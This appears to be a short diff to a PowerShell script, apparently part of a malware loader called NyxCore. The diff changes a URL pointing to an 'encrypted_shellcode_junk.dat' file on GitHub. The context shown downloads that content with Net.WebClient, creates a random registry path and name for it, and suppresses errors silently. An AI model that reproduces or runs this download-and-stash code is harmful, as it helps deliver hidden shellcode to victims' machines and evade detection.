@@ -1,4 +1,4 @@
-$junkUrl = "https://raw.githubusercontent.com/h41th3m0x/NyxCore/refs/heads/main/encrypted_shellcode_junk.dat"
+$junkUrl = "https://raw.githubusercontent.com/h41th3m0x/NyXC0r3-v1.0/refs/heads/main/Data/encrypted_shellcode_junk.dat"
 $junkContent = [System.Text.Encoding]::UTF8.GetString((New-Object Net.WebClient).DownloadData($junkUrl))
 
 # Create random registry path and name
@@ -24,4 +24,5 @@ try {
 }
 catch {
     # Silent fail
+
 }
